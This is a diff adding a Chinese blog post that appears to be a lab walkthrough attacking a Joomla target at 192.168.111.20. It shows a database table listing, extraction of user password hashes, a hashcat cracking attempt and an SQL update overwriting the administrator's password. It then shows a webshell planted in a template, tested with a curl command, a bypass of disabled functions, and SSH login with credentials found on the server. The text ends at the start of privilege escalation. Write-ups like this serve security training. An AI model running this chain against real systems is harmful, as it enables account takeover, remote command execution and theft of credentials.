+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms2 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms3 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms4 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms5 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms6 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms7 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms8 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_terms9 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_termsa &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_termsb &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_termsc &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_termsd &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_termse &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_links_termsf &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_taxonomy &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_taxonomy_map &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_terms &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_terms_common &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_tokens &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_tokens_aggregate &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_finder_types &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_languages &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_menu &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_menu_types &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_messages &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_messages_cfg &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_modules &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_modules_menu &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_newsfeeds &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_overrider &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_postinstall_messages &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_privacy_consents &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_privacy_requests &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_redirect_links &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_schemas &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_session &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_tags &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_template_styles &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_ucm_base &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_ucm_content &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_ucm_history &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_update_sites &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_update_sites_extensions &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_updates &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_user_keys &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_user_notes &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_user_profiles &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_user_usergroup_map &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_usergroups &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_users &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_utf8_conversion &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> am2zu_viewlevels &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_action_log_config &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_action_logs &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_action_logs_extensions &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_action_logs_users &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_assets &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_associations &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_banner_clients &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_banner_tracks &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_banners &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_categories &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_contact_details &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_content &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_content_frontpage &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_content_rating &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_content_types &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_contentitem_tag_map &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_core_log_searches &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_extensions &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_fields &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_fields_categories &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_fields_groups &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_fields_values &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_filters &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms0 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms1 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms2 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms3 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms4 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms5 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms6 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms7 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms8 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_terms9 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_termsa &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_termsb &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_termsc &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_termsd &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_termse &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_links_termsf &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_taxonomy &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_taxonomy_map &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_terms &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_terms_common &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_tokens &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_tokens_aggregate &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_finder_types &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_languages &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_menu &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_menu_types &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_messages &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_messages_cfg &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_modules &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_modules_menu &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_newsfeeds &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_overrider &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_postinstall_messages &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_privacy_consents &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_privacy_requests &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_redirect_links &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_schemas &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_session &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_tags &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_template_styles &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_ucm_base &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_ucm_content &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_ucm_history &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_update_sites &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_update_sites_extensions &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_updates &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_user_keys &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_user_notes &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_user_profiles &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_user_usergroup_map &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_usergroups &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_users &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_utf8_conversion &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> umnbt_viewlevels &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-------------------------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">156&lt;/span> rows in &lt;span class="nb">set&lt;/span> &lt;span class="o">(&lt;/span>0.071 sec&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到有一个&lt;code>am2zu_users&lt;/code> 表&lt;/p>
+&lt;p>查这个表中的列名 &lt;code>show columns from am2zu_users;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco2uw3ulj30vn0h0aht.jpg"
+loading="lazy"
+alt="image-20260620165554672"
+>&lt;/p>
+&lt;p>查下用户密码 &lt;code>select id, name, username, password from am2zu_users;&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco2uieg7j313l06j434.jpg"
+loading="lazy"
+alt="image-20260620165738108"
+>&lt;/p>
+&lt;p>前面&lt;code>diesearch&lt;/code>扫到了&lt;code>/administrator&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2ucov6j31550qidiz.jpg"
+loading="lazy"
+alt="image-20260620165943413"
+>&lt;/p>
+&lt;p>现在拿到了用户名对应的密码hash&lt;/p>
+&lt;p>一般来说可以尝试利用 hashcat 破解&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashcat creds /usr/share/wordlists/rockyou.txt --username -m &lt;span class="m">3200&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat creds /usr/share/wordlists/rockyou.txt --username -m &lt;span class="m">3200&lt;/span> --show
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但这里破解失败了，在 joomla 的官方文档中有规定&lt;a class="link" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F" target="_blank" rel="noopener"
+>修改密码的操作&lt;/a>&lt;/p>
+&lt;p>根据它的 Method2，可以重置密码&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ php -r &lt;span class="s2">&amp;#34;echo password_hash(&amp;#39;admin@123&amp;#39;, PASSWORD_BCRYPT), PHP_EOL;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$2&lt;/span>y&lt;span class="nv">$12$EElLZG&lt;/span>.KfqIJMM7zyIWfXOa8Jl0ojN9HwQ7Y1xexJ780g15HNY.0S
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>生成一个密码hash，然后用我们生成的密码哈希替换原来的hash值，就可以篡改密码了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">update am2zu_users &lt;span class="nb">set&lt;/span> &lt;span class="nv">password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">y&lt;/span>&lt;span class="nv">$12$Rvph3unK0oEY9MKKkvyMYumfi0A8foqYI1DdOkccHuh5vV&lt;/span>&lt;span class="s2">.5X4X
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Ru&amp;#34;&lt;/span> where &lt;span class="nv">username&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco2u4m94j313o039766.jpg"
+loading="lazy"
+alt="image-20260620170459534"
+>&lt;/p>
+&lt;p>现在我们已经成功把密码修改成&lt;code>admin@123&lt;/code>了，现在登录joomla后台&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco33va92j30wj0cqgp2.jpg"
+loading="lazy"
+alt="image-20260620170708894"
+>&lt;/p>
+&lt;p>joomla后台管理模板处可以编辑PHP代码，可以在那里插入我们的webshell&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco33prn8j30uw073jvd.jpg"
+loading="lazy"
+alt="2769156-20241004201704028-599332199"
+>&lt;/p>
+&lt;p>两个模板随便选一个，不过后面要注意路径名&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco33j0sdj31fl0v04ay.jpg"
+loading="lazy"
+alt="image-20260620171057670"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco32zg3oj31g60vawxe.jpg"
+loading="lazy"
+alt="image-20260620171705539"
+>&lt;/p>
+&lt;p>写入webshell点击保存就可以了&lt;/p>
+&lt;p>可以跑一下phpinfo来验证一下写成功了没&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -X POST -d &lt;span class="s2">&amp;#34;cmd=phpinfo();&amp;#34;&lt;/span> -u &lt;span class="s2">&amp;#34;administrator:admin@123&amp;#34;&lt;/span> http://192.168.111.20/templates/protostar/index.php &amp;gt; index.html
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco32ndl6j31du0xrn9p.jpg"
+loading="lazy"
+alt="image-20260620171841657"
+>&lt;/p>
+&lt;p>可以看到写成功了，但是这里ban掉了很多命令执行函数，这里要做一下绕过，不然可能会有点麻烦&lt;/p>
+&lt;p>先连到蚁剑，然后在插件市场可以找到下面这个插件，我这里已经下好了&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco32d0d0j31330ri0w2.jpg"
+loading="lazy"
+alt="image-20260620172139700"
+>&lt;/p>
+&lt;p>然后&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msgy1ieco32631cj30sv0hztbn.jpg"
+loading="lazy"
+alt="image-20260620172314548"
+>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco31zp5ij30i50cxjtm.jpg"
+loading="lazy"
+alt="image-20260620172357043"
+>&lt;/p>
+&lt;p>点击开始，就可以成功绕过了&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msgy1ieco31ukkaj30lc059abh.jpg"
+loading="lazy"
+alt="image-20260620172500171"
+>&lt;/p>
+&lt;p>经过翻找服务器文件，在&lt;code>/tmp/mysql/test.txt&lt;/code>找到了ssh的账户密码&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msgy1ieco31p6t9j30ep04gwek.jpg"
+loading="lazy"
+alt="image-20260620172717562"
+>&lt;/p>
+&lt;p>然后就可以ssh登录了，由于靶机上的ssh版本太旧了，所以需要加上&lt;code>-o HostKeyAlgorithms=+ssh-rsa&lt;/code>才可以&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh wwwuser@192.168.111.20 -o &lt;span class="nv">HostKeyAlgorithms&lt;/span>&lt;span class="o">=&lt;/span>+ssh-rsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msgy1ieco31jtp2j30rr07lq74.jpg"
+loading="lazy"
+alt="image-20260620172855425"
+>&lt;/p>
+&lt;p>由于wwwuser是低权限用户，所以这里要提权&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>wwwuser@localhost ~&lt;span class="o">]&lt;/span>$ uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux localhost.localdomain 2.6.32-431.el6.x86_64 &lt;span class="c1">#1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
